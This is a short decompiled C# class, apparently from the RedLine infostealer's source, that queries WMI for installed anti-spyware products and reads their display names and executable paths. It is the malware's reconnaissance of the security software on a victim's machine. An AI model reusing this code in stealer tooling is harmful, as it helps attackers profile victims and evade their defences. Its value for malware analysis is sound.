using System;

namespace RedLine.Models.WMI
{
	// Token: 0x02000020 RID: 32
	public class WmiAntiSpyWareQuery : WmiQueryBase
	{
		// Token: 0x060000CB RID: 203 RVA: 0x00003E67 File Offset: 0x00002067
		public WmiAntiSpyWareQuery() : base("AntiSpyWareProduct", null, new string[]
		{
			"displayName",
			"pathToSignedProductExe"
		})
		{
		}
	}
}
